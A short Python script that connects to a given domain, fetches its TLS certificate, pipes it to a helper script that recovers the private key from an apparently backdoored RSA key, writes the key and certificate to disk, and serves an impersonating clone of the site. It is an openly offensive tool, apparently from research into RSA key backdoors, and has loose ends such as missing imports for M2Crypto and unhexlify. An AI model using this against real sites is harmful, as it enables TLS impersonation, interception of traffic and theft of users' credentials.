#!/usr/bin/env python3

import ssl
import subprocess
import argparse

import serve

PORT=4443

def get_public_key(cert_string):
    cert = M2Crypto.X509.load_cert_string(cert_string)
    return unhexlify(cert.get_pubkey().get_modulus())

def clone_server(server, port):
    # Get the public key and reverse it
    print("Connecting to {}:{}".format(server, port))
    certstr = ssl.get_server_certificate((server,port), ssl_version=ssl.PROTOCOL_TLSv1_2)
    print("Got certificate from {}".format(server))
    privstr = subprocess.check_output(["./rsabd.py"], input=certstr, universal_newlines=True)
    print("Reversed private key from certificate")

    return certstr, privstr

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Clone a website's backdoor-ed key")
    parser.add_argument('domain', help='Domain to clone.')
    parser.add_argument('--remoteport', type=int, default=PORT, help='Port to connect to target server on.')
    parser.add_argument('--port', type=int, default=PORT+1, help='Port to serve clone on.')
    args = parser.parse_args()

    certstr, privstr = clone_server(args.domain, args.remoteport)

    certfile = args.domain + ".clone.crt"
    keyfile = args.domain + ".clone.key"

    # write the certificate and private key to disk
    with open(certfile, 'w') as cf:
        cf.write(certstr)
    with open(keyfile, 'w') as kf:
        kf.write(privstr)

    print("Serving clone")
    serve.serve(args.port, certfile, keyfile)
